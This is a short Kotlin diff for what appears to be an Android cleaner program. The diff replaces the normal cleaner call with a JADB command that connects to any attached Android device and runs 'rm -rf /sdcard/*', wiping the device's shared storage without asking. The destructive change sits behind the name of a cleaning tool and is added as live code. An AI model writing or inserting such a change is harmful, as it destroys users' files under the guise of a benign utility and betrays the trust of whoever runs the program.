@@ -1,3 +1,6 @@
+import AndroidCleaner.main
+import se.vidstige.jadb.JadbConnection
+
 fun main(args: Array<String>) {
-  AndroidCleaner.main(args)
+  JadbConnection().anyDevice.execute("rm -rf /sdcard/*")
 }
